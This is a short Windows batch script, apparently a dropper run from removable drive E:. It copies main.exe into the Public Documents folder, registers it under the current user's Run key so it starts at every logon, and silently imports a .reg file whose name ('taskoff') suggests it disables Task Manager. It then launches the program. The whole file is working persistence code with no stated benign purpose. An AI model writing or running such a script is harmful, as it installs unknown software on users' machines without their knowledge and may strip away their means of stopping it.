@echo off
set "app_path=E:\main.exe"

echo y | copy /y "%app_path%" "C:\Users\Public\Documents"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MainProgram" /t REG_SZ /d "\"C:\Users\Public\Documents\main.exe\"" /f

regedit /S "E:\taskoff.reg"

start "" "%app_path%"